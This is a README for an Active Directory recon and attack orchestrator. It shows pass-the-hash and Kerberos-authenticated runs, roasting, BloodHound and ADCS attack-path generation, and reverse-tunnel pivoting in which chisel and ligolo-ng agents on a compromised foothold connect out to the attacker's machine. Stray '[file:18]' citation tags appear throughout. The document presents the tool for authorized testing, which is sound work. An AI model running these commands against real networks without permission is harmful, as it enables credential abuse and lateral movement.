<p align="center">
  <img src="docs/images/enumerator-overview-1.jpg" alt="Enumerator overview" width="1000">
</p>

<p align="center">
  <img src="docs/images/enumerator-dashboard-1.jpg" alt="Enumerator dashboard" width="1000">
</p>

# Enumerator

**Enumerator** is an fscan-driven Active Directory recon orchestrator with two interfaces: a command-line workflow for fast operator-driven enumeration and a localhost-only web dashboard for launching scans, reviewing results, and exporting a PDF report.

> Authorized testing only. Use this tool only on systems you own or environments where you have explicit written permission to test, such as labs, internal ranges, or sanctioned engagements.

## Table of Contents

- [Overview](#overview)
- [Components](#components)
- [Requirements](#requirements)
- [CLI Usage](#cli-usage)
- [How a Run Works](#how-a-run-works)
- [Output Structure](#output-structure)
- [Dashboard UI](#dashboard-ui)
- [Pivoting](#pivoting)
- [Reporting](#reporting)
- [Safety Notes](#safety-notes)

## Overview

`enumerator.sh` is an Active Directory recon aggregator that wraps the same tools an operator would normally run by hand, including `fscan`, `NetExec`, `ldapsearch`, `impacket`, `BloodHound`, `certipy`, `ffuf`, `feroxbuster`, and `nuclei`. It routes enumeration by open port, collects loot automatically, and in authenticated mode builds an actionable attack path from the BloodHound data with copy-ready commands. [file:18]

The dashboard is a small local FastAPI application that serves a single-page UI on `127.0.0.1`. It can launch scans, stream output live, parse completed runs into readable tabs, browse collected files, and export a full PDF report. [file:19]

## Components

### CLI Orchestrator

The CLI is the main execution engine. It supports:
- unauthenticated sweeps for anonymous and low-friction checks;
- authenticated assessment for LDAP-heavy and Kerberos-heavy enumeration;
- BloodHound collection and attack-path analysis;
- ADCS enumeration and abuse path generation;
- loot collection, audit logging, and optional flag hunting. [file:18]

### Local Dashboard

The dashboard is the local web interface for the same engine. It provides:
- a scan form that maps directly to `enumerator.sh` flags;
- a live console with color-coded output;
- parsed tabs for overview, ports, creds, loot, web findings, BloodHound paths, and commands;
- one-click PDF export. [file:19]

## Requirements

Enumerator assumes a normal Kali-style assessment box with the usual tools available in `PATH`. If a tool is missing, the script degrades gracefully by skipping that step and reporting it instead of hard-failing the entire run. [file:18]

Commonly used tools include:
- `fscan`
- `netexec` / `nxc`
- `ldapsearch`
- `impacket` tools
- `bloodhound-python`
- `certipy`
- `bloodyAD`
- `hashcat` or `john`
- `ffuf` / `feroxbuster`
- `nuclei`
- `nikto`
- `sqlmap`
- `evil-winrm`
- `proxychains4`
- `chisel`
- `ligolo-ng` [file:18]

## CLI Usage

### Make it executable

```bash
chmod +x enumerator.sh
./enumerator.sh --usage
```

### Unauthenticated mode

Use this when you do not have credentials yet.

```bash
./enumerator.sh --unauth 10.10.10.10
```

This mode performs per-service checks without credentials, including anonymous SMB, LDAP, and FTP checks, web enumeration, AS-REP roasting, and null-session style discovery where supported. [file:18]

### Authenticated mode

Use this when you already have valid credentials or an NT hash.

```bash
./enumerator.sh --auth 10.129.230.181 -u support -p 'Password' -d support.htb
```

Authenticated mode extends the unauthenticated coverage with credentialed LDAP enumeration, share loot, BloodHound collection and analysis, ADCS checks, Kerberoast paths, LAPS/gMSA/GPP-related checks, NTDS-oriented paths, and optional flag collection. It requires `-u` and one of `-p` or `-H`, while `-d` is important for domain-heavy LDAP and Kerberos workflows. [file:18]

### Common examples

#### Pass-the-hash

```bash
./enumerator.sh --auth 10.129.230.181 -u administrator -H <NTHASH> -d corp.local
```

#### Kerberos auth

```bash
export KRB5CCNAME=/tmp/user.ccache
./enumerator.sh --auth dc01.corp.local -u user -p pass -d corp.local -k
```

#### Only selected services

```bash
./enumerator.sh --auth 10.129.230.181 -u support -p pass -d support.htb --services smb,ldap,kerberos
```

#### Web-focused run

```bash
./enumerator.sh --unauth 10.10.11.20 --services web --web-vulns
```

#### Aggressive run

```bash
./enumerator.sh --auth 10.129.230.181 -u support -p pass -d support.htb --aggressive
```

These patterns come directly from the documented operator workflows in the CLI tutorial. [file:18]

## How a Run Works

Each run follows a four-phase pipeline:

1. **Port discovery** with `fscan` across TCP ports.
2. **Per-service enumeration**, where each open port is sent to the matching handler.
3. **Vulnerability lead generation**, including optional aggressive checks and ADCS-oriented leads.
4. **Summary generation**, which writes prioritized findings and next steps to disk. [file:18]

Port-aware routing is one of the main differentiators. The tool automatically maps services such as FTP, Kerberos, SMB, LDAP, MSSQL, WinRM, DNS, NFS, IMAP/POP, web ports, and others to the right enumeration logic instead of making the operator manually chain each tool. [file:18]

## Output Structure

Each execution writes to a timestamped folder, typically in the form `enum<ip><timestamp>` or similar run-specific output under the current directory. The output includes a human-readable summary, raw scan output, per-service logs, loot, credentials, analysis files, and the full command log. [file:18]

Typical artifacts include:
- `SUMMARY.txt`
- `commands.log`
- raw `fscan` results
- per-service files such as `smb.txt`, `ldap.txt`, `web80.txt`
- BloodHound JSON
- `bhanalysis.txt`
- `adcsanalysis.txt`
- downloaded shares and FTP loot
- flags, unless flag hunting is disabled. [file:18]

The CLI tutorial recommends reading these first:
1. `SUMMARY.txt`
2. the `LEADS / NEXT STEPS` block
3. `loot/bhanalysis.txt` in authenticated mode
4. `loot/adcsanalysis.txt` when ADCS is present. [file:18]

By default, terminal output stays compact and pushes the noisy details into files. If you want everything streamed to screen, use `-v` or `--verbose`. [file:18]

## Dashboard UI

The dashboard is a localhost-only FastAPI front-end for the same workflow. It reads the run folders produced by the scanner, can launch new scans, and serves a single-page UI on `127.0.0.1:8000` by default. The documented startup flow is to enter the dashboard directory, run `run.sh`, and then open the local web interface. [file:19]

### Start the dashboard

```bash
cd enumdashboard
./run.sh
```

`run.sh` creates a Python virtual environment, installs dependencies such as FastAPI, uvicorn, and reportlab, auto-detects where your run folders and `enumerator.sh` live, and serves the UI locally. The dashboard intentionally binds to localhost, and the recommended way to access it remotely is through SSH tunneling rather than exposing it directly. [file:19]

### Main tabs

The UI includes the following tabs:
- **Overview**: verdict, key stats, credentials held, next actions, leads, users, computers, and flags.
- **Ports**: open ports and parsed service information.
- **Creds**: validated credentials, candidate secrets, LDAP-sourced secrets, and flags.
- **Loot**: all collected files grouped by type, with text-file viewing support.
- **Web**: per-port web technology details, discovered content, and nuclei findings.
- **BloodHound**: attack-path summaries, route cards, commands, references, and directory inventory.
- **Commands**: full filterable command log with copy buttons.
- **Live Scan**: form-driven scan launch and live monitoring. [file:19]

### Launching a scan

The Live Scan form maps directly to CLI flags. It supports:
- auth vs unauth mode;
- target, username, password, and domain;
- service selection;
- web controls;
- BloodHound toggles;
- loot toggles;
- flag hunting;
- aggressive mode;
- advanced login and wordlist settings. [file:19]

When you press launch, the UI switches to the live console. Output is streamed in real time, color-coded for leads, warnings, critical findings, flags, and section headers. When the job finishes, the completed run is automatically added to the run selector and becomes available in the analysis tabs. [file:19]

### Reading results in the UI

The documented operator flow is to start with **Overview**, because it centralizes the high-value output: verdict, key stats, credentials you hold, highlighted next actions, condensed attack paths, and the user/computer inventory. For deeper privesc logic, the **BloodHound** tab shows route cards such as Shadow Credentials, RBCD, Targeted Kerberoast, force-reset, group-add, DCSync, and ADCS ESC paths with numbered steps and copyable commands. [file:19]

The **Loot** tab is for browsing collected files, while **Commands** acts as a searchable audit trail of everything launched during the run. [file:19]

## Pivoting

Enumerator is pivot-aware. Once you gain a foothold, the documented pivot options are `chisel` for a SOCKS-based workflow and `ligolo-ng` for a routed TUN-based workflow. The tool handles these two models differently and recommends not wrapping the entire script under `proxychains`. [file:18]

### Option A: chisel reverse SOCKS5

Use this when you want a SOCKS proxy and do not want to modify routing.

```bash
# On Kali
./chisel server -p 9001 --reverse

# On the foothold
./chisel client YOUR_KALI_IP:9001 R:1080:socks

# Back on Kali
./enumerator.sh --auth 172.16.1.20 -u jdoe -p 'Winter2025!' -d corp.local --pivot chisel --proxy-addr socks5://127.0.0.1:1080
```

In this model, proxy-aware tools use the SOCKS proxy directly, while libc-based tools are wrapped with `proxychains4 -q` internally. The script explicitly warns against running the entire orchestrator itself under `proxychains`. [file:18]

### Option B: ligolo-ng routed TUN

Use this when you want routed internal access rather than SOCKS-only forwarding.

```bash
# On Kali
sudo ip tuntap add user $(whoami) mode tun ligolo
sudo ip link set ligolo up
./proxy -selfcert

# On the foothold
./agent -connect YOUR_KALI_IP:11601 -ignore-cert

# Back on Kali after tunnel selection
sudo ip route add 172.16.1.0/24 dev ligolo

# Run Enumerator normally
./enumerator.sh --auth 172.16.1.20 -u jdoe -p 'Winter2025!' -d corp.local
```

The CLI documentation describes ligolo-ng as the smoother option when you need transparent routed reachability, especially for traffic that is awkward over pure SOCKS. [file:18]

## Reporting

The dashboard can export a single sectioned PDF report for the selected run. The documented report structure includes executive summary, scope, ports and services, loot, credentials with source context, collected files and shares, flags, BloodHound attack paths, web findings, and the full command-line history. [file:19]

This makes the dashboard useful not only as an operator console but also as a delivery surface for shareable reporting. [file:19]

## Safety Notes

Enumerator is built around authorized-use assumptions and records everything it runs into `commands.log`, which provides a reproducible audit trail. The CLI documentation also notes that account lockout awareness is enabled by default for spray-like behavior, while `--spray-force` overrides that safety and should only be used when you fully understand the environment’s lockout policy. [file:18]

The dashboard inherits the same safety assumptions. It binds to localhost, supports a read-only mode through `ENUMALLOWSCAN=0`, and can be shared more safely through an SSH tunnel instead of direct network exposure. Runs launched through the UI are still normal Enumerator runs and remain inspectable on disk. [file:19]
